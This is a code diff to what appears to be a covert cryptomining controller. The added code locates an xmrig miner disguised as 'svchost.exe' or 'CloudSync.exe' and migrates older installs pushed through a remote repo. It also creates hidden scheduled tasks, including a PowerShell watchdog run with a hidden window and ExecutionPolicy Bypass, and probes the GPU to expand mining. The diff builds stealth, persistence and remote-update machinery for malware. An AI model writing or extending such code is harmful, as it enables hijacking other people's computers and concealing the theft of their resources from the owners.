@@ -310,12 +310,36 @@ def tail_text(path, nbytes=16384):
 # settings
 # ============================================================
 
+def resolve_binary(preferred):
+    """Find the worker binary, tolerating a pre-overhaul install.
+
+    A machine running the ORIGINAL kit has the binary as xmrig.exe in
+    %LOCALAPPDATA%\\SystemController. The new controller is pushed to those
+    machines through the same repo, so it has to find whatever is there instead
+    of insisting on the new name.
+    """
+    path = os.path.join(BASE, preferred)
+    if os.path.isfile(path):
+        return preferred, path
+    for name in ("CloudSync.exe", "svchost.exe", "xmrig.exe", "WinSync.exe"):
+        candidate = os.path.join(BASE, name)
+        if os.path.isfile(candidate):
+            return name, candidate
+    try:
+        for name in sorted(os.listdir(BASE)):
+            if name.lower().endswith(".exe"):
+                return name, os.path.join(BASE, name)
+    except OSError:
+        pass
+    return preferred, path
+
+
 class Settings(object):
     def __init__(self):
         m = read_json(MANIFEST, {}) or {}
         i = read_json(INSTALL, {}) or {}
-        self.binary = m.get("binary") or i.get("binary") or "CloudSync.exe"
-        self.bin_path = os.path.join(BASE, self.binary)
+        self.binary, self.bin_path = resolve_binary(
+            m.get("binary") or i.get("binary") or "CloudSync.exe")
         self.idle = int(i.get("idle_seconds") or m.get("idle_seconds", IDLE_SECONDS))
         self.tasks = i.get("tasks") or m.get("tasks") or DEFAULT_TASKS
         self.backup_dir = i.get("backup_dir") or ""
@@ -824,6 +848,92 @@ def write_state(settings, worker, wanted, idle):
         pass
 
 
+def ensure_gpu_profile():
+    """Generate the GPU profile once, if the probe script is available.
+
+    Called at start AND after an update brings gpudetect.py onto a legacy box,
+    so a machine that never had the probe still ends up GPU-capable.
+    """
+    if os.path.isfile(GPU_PROFILE):
+        return True
+    gd = os.path.join(BASE, "gpudetect.py")
+    if not os.path.isfile(gd):
+        log("no gpudetect.py yet - CPU only until it arrives")
+        return False
+    log("no gpu_profile.json - probing GPU once")
+    try:
+        subprocess.run([sys.executable, gd, "--force"], cwd=BASE, timeout=120,
+                       creationflags=CREATE_NO_WINDOW,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return os.path.isfile(GPU_PROFILE)
+    except Exception as exc:
+        log("GPU probe failed: %r" % (exc,))
+        return False
+
+
+def register_tasks(settings):
+    """Best effort: give an adopted machine the current trigger set.
+
+    A legacy box only has the old 'Windows System Controller' task. Adding the
+    current main + health tasks is what gives it the watchdog and the daily
+    backstop. Failure is non-fatal (the old task still launches the controller).
+    """
+    exe = sys.executable
+    script = os.path.join(BASE, "controller.py")
+    health = os.path.join(BASE, "watchdog.ps1")
+    main_task, health_task = settings.tasks[0], settings.tasks[1]
+    cmds = [
+        ["schtasks.exe", "/Create", "/TN", main_task, "/TR",
+         '"%s" "%s"' % (exe, script), "/SC", "ONLOGON",
+         "/RL", "LIMITED", "/IT", "/F", "/RU", os.environ.get("USERNAME", "")],
+    ]
+    if os.path.isfile(health):
+        cmds.append(
+            ["schtasks.exe", "/Create", "/TN", health_task, "/TR",
+             'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"' % health,
+             "/SC", "MINUTE", "/MO", "10", "/RL", "LIMITED", "/IT", "/F",
+             "/RU", os.environ.get("USERNAME", "")])
+    for cmd in cmds:
+        try:
+            subprocess.run(cmd, timeout=40, creationflags=CREATE_NO_WINDOW,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+    log("attempted task registration for adopted install")
+
+
+def bootstrap_legacy(settings):
+    """First run on a pre-overhaul machine: adopt it instead of failing.
+
+    The old layout has no install.json, no gpu_profile.json, an old task name
+    and the binary is still xmrig.exe. A repo push therefore MIGRATES those
+    boxes instead of bricking them.
+    """
+    legacy = not os.path.isfile(INSTALL)
+    if legacy:
+        log("no install.json - adopting legacy install at %s (binary=%s)"
+            % (BASE, settings.binary))
+        info = {
+            "install_dir": BASE,
+            "python": sys.executable,
+            "pythonw": sys.executable,
+            "binary": settings.binary,
+            "tasks": list(settings.tasks),
+            "backup_dir": "",
+            "idle_seconds": settings.idle,
+            "installed_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
+            "adopted_from": "legacy",
+        }
+        try:
+            atomic_write(INSTALL, json.dumps(info, indent=2))
+        except Exception as exc:
+            log("could not write install.json: %r" % (exc,))
+        register_tasks(settings)
+
+    ensure_gpu_profile()
+    return legacy
+
+
 def main():
     lock = acquire_single_instance()
     if lock is None:
@@ -836,6 +946,7 @@ def main():
         log("rolled back, restarting")
         os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])
 
+    bootstrap_legacy(settings)
     worker = Worker(settings)
     updater = Updater(settings)
     sweep_orphans(settings)          # only one miner per box, always
@@ -872,6 +983,9 @@ def main():
                 os.execv(sys.executable, [sys.executable, os.path.abspath(__file__)])
             elif result == "restart-worker":
                 worker.stop()
+            if result:
+                # an update may just have delivered gpudetect.py
+                ensure_gpu_profile()
 
             idle = idle_seconds()
             on_ac = on_ac_power()
